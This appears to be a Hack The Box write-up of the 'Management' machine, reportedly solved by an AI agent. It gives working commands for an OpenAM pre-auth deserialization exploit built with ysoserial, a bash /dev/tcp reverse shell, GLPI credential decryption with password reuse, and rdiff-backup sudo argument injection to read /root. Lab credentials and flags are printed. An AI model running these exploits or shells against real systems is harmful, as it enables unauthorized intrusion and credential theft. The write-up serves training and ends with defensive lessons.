---
layout: post
title:  "Hack The Box - Management"
description: HTB Management walkthrough - OpenAM pre-auth deserialization (CVE-2026-33439) to GLPI credential reuse and a sudo rdiff-backup root read
tags: HackTheBox Linux Boot2Root Easy
media_subpath: /assets/img/writeups/Hack The Box/Management/
image:
  path: /assets/img/writeups/Hack The Box/Management/management_solved.png
  alt: Management machine completion banner showing user and root flags
  width: 884
  height: 306
---

## At a glance

| Item                 | Details             |
| -------------------- | ------------------- |
| **Type**             | Boot2Root           |
| **Difficulty**       | Easy                |
| **Operating System** | Linux (Ubuntu)      |
| **Platform**         | Hack The Box        |

*This machine was solved autonomously by the Username AI agent.*

## Summary

The target ran OpenAM 16.0.5 (behind Tomcat/nginx) alongside a GLPI installation and an OpenDJ LDAP directory. A pre-auth deserialization vulnerability in OpenAM (`jato.clientSession` on the password-reset validation endpoint, CVE-2026-33439) gave an unauthenticated shell as `openam`.

From there, GLPI's database configuration leaked MySQL credentials, and the `glpi_authldaps` table held an encrypted LDAP bind password. GLPI's own key file (`glpicrypt.key`, world-readable to the service account) decrypts it with libsodium XChaCha20-Poly1305 — yielding the `svc-glpi` password, which was reused as `owen`'s local password for the user flag.

Privilege escalation abused a `sudo NOPASSWD` `rdiff-backup` rule with a trailing `*` wildcard: a second `--restrict-path /::/root` injected through `--remote-schema` mirrored `/root` into a writable directory and exposed the root flag.

## 1. Enumeration

### Port scan

```bash
nmap --privileged -sS -Pn -p- --min-rate 3000 -T4 10.129.76.28
```

```text
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
50389/tcp open  unknown
4444/tcp  open  krb524
45011/tcp open  unknown
```

### Service detection

```bash
nmap -sC -sV -p22,80,443,4444,45011,50389 10.129.76.28
```

```text
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
80/tcp    open  http     nginx 1.24.0 (Ubuntu)  → 301 to https://management.htb/
443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
50389/tcp open  ldap     (Anonymous bind OK)
45011/tcp open  java-rmi Java RMI
```

### Virtual hosts

- `management.htb` — static marketing SPA in `/var/www/management/` (encrypted JS bundle, decoy — no backend).
- `sso.management.htb` — OpenAM 16.0.5 behind Tomcat 10.1.52.

The OpenAM server info endpoint leaks the realm config:

```bash
curl -sk https://sso.management.htb/openam/json/serverinfo/* -H 'Host: sso.management.htb'
```

```json
{
  "cookieName": "iPlanetDirectoryPro",
  "realm": "/",
  "domains": [".management.htb"],
  "xuiUserSessionValidationEnabled": true
}
```

## 2. Foothold — OpenAM pre-auth RCE (CVE-2026-33439)

OpenAM 16.0.5 bundles Click 2.3.0 and Xalan 2.7.3. The `jato.clientSession` parameter on `/openam/ui/PWResetUserValidation` is deserialized without authentication.

### The payload obstruction (and the fix)

A stock ysoserial Click1 payload fails with:

```text
java.lang.RuntimeException: Error getting property 'outputProperties'
from class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
  at org.apache.click.util.PropertyUtils.getObjectPropertyValue(PropertyUtils.java:236)
```

Click's `PropertyUtils` cannot read `TemplatesImpl.outputProperties` on the JDK-internal class. **The fix is to build ysoserial with `-DproperXalan=true`**, which forces the *external* `org.apache.xalan.xsltc.trax.TemplatesImpl` instead of the JDK-internal one:

```bash
java -DproperXalan=true -jar ysoserial-all.jar Click1 "<command>" > payload.bin
```

### Exploit

```bash
PAYLOAD=$(base64 -w0 payload.bin)
curl -sk 'https://sso.management.htb/openam/ui/PWResetUserValidation' \
  -H 'Host: sso.management.htb' \
  --data-urlencode "jato.clientSession=$PAYLOAD"
```

Deserialization is confirmed when the response echoes an empty `clientSession` field (the exception is caught *after* `readObject()`).

### Proof of execution

Out-of-band confirmation via interactsh (the target egresses to the internet):

```text
DNS query: rceA.<id>.oast.me  from 210.187.85.x
```

### Shell

```bash
# on the attacker host
nc -lvnp 5555
# payload command (reverse shell)
bash -c 'bash -i >& /dev/tcp/<LHOST>/5555 0>&1'
```

```text
$ id
uid=996(openam) gid=987(openam) groups=987(openam)
$ hostname
management
```

## 3. Credential recovery — GLPI service account

### Database credentials

`/opt/glpi/config/config_db.php` (readable as `openam`):

```php
public $dbhost = '127.0.0.1';
public $dbuser = 'glpi';
public $dbpassword = '8rhu0L6Pw4Y7';
public $dbdefault = 'glpidb';
```

### LDAP bind password (encrypted)

```bash
mariadb -u glpi -p8rhu0L6Pw4Y7 glpidb \
  -e "select id,name,rootdn,rootdn_passwd from glpi_authldaps;"
```

```text
1  Management Directory  cn=svc-glpi,ou=services,dc=management,dc=htb
   avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
```

### Decrypt with GLPI's own key

`/opt/glpi/config/glpicrypt.key` is a 32-byte key. GLPI's `GLPIKey::decrypt()` uses libsodium **XChaCha20-Poly1305** with the nonce as both nonce and associated data:

```php
<?php
$key = file_get_contents('/opt/glpi/config/glpicrypt.key');
$raw = base64_decode('avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==');
$nonce = substr($raw, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
$ct = substr($raw, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
echo sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ct, $nonce, $nonce, $key);
```

```text
WpczC40GhTbk
```

## 4. User flag — password reuse

The decrypted service-account password is reused as the local `owen` account's password:

```bash
echo WpczC40GhTbk | su - owen -c 'id; cat /home/owen/user.txt'
```

```text
uid=1000(owen) gid=1000(owen) groups=1000(owen)
f2aafd6d54f348ea8a5d81a6fa17a73f
```

**User flag: `f2aafd6d54f348ea8a5d81a6fa17a73f`**

## 5. Privilege escalation — rdiff-backup argument injection

### Sudo policy

```bash
sudo -l
```

```text
User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup
        --restrict-mode read-only *
```

The trailing `*` allows arbitrary additional arguments. The intended restriction is `--restrict-path /opt/backup` with `--restrict-mode read-only`, but a second `--restrict-path` overrides it.

### Exploit

```bash
rdiff-backup \
  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' \
  backup /::/root /tmp/root_backup
```

```text
NOTE: Starting mirror from source path /root to destination path /tmp/root_backup
```

### Root flag

```bash
ls -la /tmp/root_backup
cat /tmp/root_backup/root.txt
```

```text
-rw-r----- 1 owen owen 33 root.txt
73374c36850c37a737a7f351b79e1b40
```

**Root flag: `73374c36850c37a737a7f351b79e1b40`**

![Hack The Box completion banner for Management](management_solved.png)
_Verification: the machine was fully solved — both flags byte-verified, completion banner confirmed._

## Security lessons

- Patch OpenAM: 16.0.5 is vulnerable to pre-auth deserialization RCE (CVE-2026-33439). Upgrade to a fixed release and disable the `PWResetUserValidation` endpoint if unused.
- Never reuse service-account passwords as local user passwords — the GLPI `svc-glpi` password being identical to `owen`'s turned a database read into full host compromise.
- A sudo wildcard (`*`) after a restricted command lets the caller append a second `--restrict-path` and read any file; pin the exact argument list or drop the wildcard.
- Protect key material: a world-readable `glpicrypt.key` means any DB read yields decryptable LDAP credentials.
